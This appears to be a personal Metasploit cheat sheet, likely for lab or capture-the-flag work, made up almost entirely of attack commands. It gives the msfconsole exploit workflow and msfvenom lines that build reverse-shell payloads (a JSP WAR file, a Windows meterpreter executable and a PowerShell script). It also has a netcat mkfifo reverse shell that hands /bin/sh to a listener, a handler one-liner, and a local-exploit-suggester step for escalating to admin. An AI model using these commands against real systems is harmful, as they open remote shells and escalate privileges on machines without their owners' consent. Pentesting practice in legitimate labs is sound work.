
MSFconsole
---
```
search $TARGET_SERVICE
use X
options
set LHOST
set RHOST
exploit
shell
background
```

See payload options:

```bash
msfvenom -p java/jsp_shell_reverse_tcp --list-options
```

Create payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f war > runme.war
```

Create bash reverse shell line:

```bash
msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
```

```bash
mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1; rm /tmp/ipvquh
```

Create reverse shell payload, exploit user and escalate to admin:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=$LOCAL_IP LPORT=4444 -f exe -o shell.exe
#powershell rev shell generator
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$TARGET_IP$ LPORT=4444 -f psh -o meterpreter-64.ps1
```

the forward slash indicates that is a "staged" payload, the one with the underscore means it’s non-staged and can be handled by program like nc

```msfconsole
use windows/x64/meterpreter/reverse_tcp
use windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit
use post/multi/recon/local_exploit_suggester
set session 1
exploit
#don't forget to set new handler to tun0 and new port
```

 ```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $LOCAL_IP;set LPORT 4444;run;" 
```